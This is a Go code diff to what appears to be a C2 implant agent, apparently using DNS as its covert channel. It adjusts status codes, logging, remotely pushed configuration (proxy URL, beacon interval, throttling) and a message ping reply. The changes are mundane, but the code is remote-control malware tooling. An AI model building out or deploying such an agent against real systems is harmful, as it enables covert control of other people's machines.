@@ -137,7 +137,7 @@ func (a *Agent) SendEncrypted(message []byte, command AgentCommand) {
 	} else {
 		commandResponse := &Command_Response{}
 		commandResponse.Output = message
-		commandResponse.Status = AgentCommandStatus_STATUS_SUCCESS
+		commandResponse.Status = AgentCommandStatus_COMMAND_STATUS_SUCCESS
 		commandResponseProto, marshalError := proto.Marshal(commandResponse)
 		if marshalError != nil {
 			log.Printf("failed marshal command response: %x (err: %q)\n", commandResponse, marshalError)
@@ -284,7 +284,7 @@ func (a *Agent) ProcessSendQ() {
 			delete(a.sendq, sendQItem)
 			a.ProcessResponse(c2Response)
 		} else {
-			log.Printf("c2 response for: %q was empty\n", query)
+			log.Printf("empty c2 response for: %q\n", query)
 		}
 
 		// response, err = net.LookupHost(query)
@@ -345,6 +345,12 @@ func (a *Agent) ProcessResponse(response []string) {
 			}
 
 			if AgentCommand(command) == AgentCommand_AGENT_IGNORE {
+				responseStatus, err := HexBytesToInt(blocks[len(blocks)-1])
+				if err != nil {
+					log.Printf("error decoding status from c2 response: %q, (err: %q)\n", response[i], err)
+					return
+				}
+				log.Printf("c2 status code: %s\n", C2ResponseStatus_name[int32(responseStatus)])
 				return
 			}
 
@@ -414,7 +420,6 @@ func (a *Agent) ProcessResponse(response []string) {
 }
 
 func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_count int) {
-	var data []byte
 
 	sortedRecords := make([]int, len(a.recvq[command][data_id]))
 	for rec := range a.recvq[command][data_id] {
@@ -422,6 +427,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 	}
 	sort.Ints(sortedRecords)
 
+	var data []byte
 	for recordNumber := range sortedRecords {
 		for i := range a.recvq[command][data_id][recordNumber] {
 			data = append(data, a.recvq[command][data_id][recordNumber][i])
@@ -484,23 +490,29 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		break
 	case AgentCommand_AGENT_SET_CONFIG:
 		newConfig := commandRequest.Config
+		log.Printf("incoming agent config update: %s\n", commandRequest.GetConfig())
 		if newConfig.GetWebKey() != nil {
-			a.config.ProxyKey = newConfig.GetWebKey().Value
+			a.config.ProxyKey = newConfig.WebKey.Value
 		}
 		if newConfig.GetWebUrl() != nil {
-			a.config.ProxyUrl = newConfig.GetWebUrl().Value
+			a.config.ProxyUrl = newConfig.WebUrl.Value
 		}
 		if newConfig.GetUseWebChannel() != nil {
-			a.config.ProxyEnabled = newConfig.GetUseWebChannel().Value
+			a.config.ProxyEnabled = newConfig.UseWebChannel.Value
 		}
 		if newConfig.GetC2IntervalMs() != nil {
-			a.config.C2Interval = int(newConfig.GetC2IntervalMs().Value)
+			a.config.C2Interval = int(newConfig.C2IntervalMs.Value)
 		}
-		log.Printf("updated config to: %s\n", commandRequest.GetConfig())
+		if newConfig.GetThrottleSendq() != nil {
+			a.config.ThrottleSendQ = newConfig.ThrottleSendq.Value
+		}
+
+		log.Printf("updated agent config: %+v\n", a.config)
 
 		break
 	case AgentCommand_AGENT_MESSAGE:
 		log.Printf("msg> %s\n", decryptedData)
+		a.SendEncrypted([]byte("pong!"), AgentCommand_AGENT_MESSAGE)
 		break
 	case AgentCommand_AGENT_SHUTDOWN:
 		log.Printf("shutting down...\n")
